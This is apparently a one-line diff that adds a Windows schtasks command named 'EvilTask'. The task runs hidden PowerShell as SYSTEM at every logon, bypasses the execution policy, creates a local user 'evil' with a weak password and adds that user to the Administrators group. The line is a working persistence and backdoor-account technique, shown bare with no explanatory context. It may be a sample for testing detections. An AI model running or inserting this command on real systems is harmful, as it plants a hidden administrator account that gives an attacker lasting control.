@@ -1,0 +1,1 @@
+schtasks /create /tn EvilTask /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'net user evil p4ssw0rd /add; net localgroup Administrateurs evil /add'" /sc onlogon /ru System
